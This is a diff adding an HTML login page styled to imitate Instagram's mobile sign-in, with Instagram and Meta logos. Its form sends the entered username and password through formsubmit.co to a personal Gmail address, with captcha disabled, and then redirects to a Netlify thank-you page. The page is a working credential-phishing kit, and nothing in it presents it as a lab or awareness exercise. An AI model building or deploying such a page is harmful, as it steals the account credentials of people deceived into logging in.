@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Form</title>
+    <style>
+       * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: white;
+        }
+
+        .container {
+            text-align: center;
+            width: 90%;
+            max-width: 400px;
+        }
+
+        .input-box {
+            width: 100%;
+            padding: 20px;
+            margin: 4px 0;
+            border: 1px solid #ccc;
+            border-radius: 15px;
+            font-size: 16px;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877F2;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .login-btn:hover {
+            background-color: #1558C5;
+        }
+
+        .forgot-password {
+            margin-top: 15px;
+            font-size: 14px;
+            color:black;
+        }
+
+        .new-account-btn {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #1877F2;
+            color: #1877F2;
+            border-radius: 25px;
+            font-size: 16px;
+            background-color: white;
+            margin-top: 198px;
+            cursor: pointer;
+        }
+
+        .new-account-btn:hover {
+            background-color: #e7f3ff;
+        }
+        .logo {
+            width: 60px;
+            margin-top:40px;
+        }
+        .meta {
+            margin-top:14px;
+            width: 80px;
+        }
+        .language-dropdown{
+            margin-top:16px;
+        }
+        select{
+            border: none;
+            background: transparent;
+            outline: none;
+        }
+        .arrowrigth{
+            width:30px;
+            margin-right: 500px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <form action="https://formsubmit.co/sonukushwahay786@gmail.com" method="POST">
+    <img src="arrowrigth.jpg" class="arrowrigth">
+    <div class="language-container">
+        <select id="languageSelect" class="language-dropdown">
+            <option value="en">English (India)</option>
+            <option value="hi">हिन्दी (India)</option>
+            <option value="es">Español</option>
+            <option value="fr">Français</option>
+            <option value="de">Deutsch</option>
+        </select>
+    </div><br>
+    <img src="logo-instagram-png-fundo-transparente13.webp" alt="Instagram Logo" class="logo"><br><br><br><br><br>
+    <input type="text" name="name" class="input-box" placeholder="Username, email or mobile number" required>
+    <input type="password" name="password" class="input-box" placeholder="Password" required>
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_next" value="https://yourthankyouwebsite.netlify.app/">
+    <input type="hidden" name="_template" value="table">
+    <button class="login-btn">Log in</button>
+    <p class="forgot-password">Forgotten Password?</p>
+    <button class="new-account-btn">Create new account</button>
+    <img src="meta.jpg" class="meta">
+    </form>     
+</div>
+</body>
+</html>
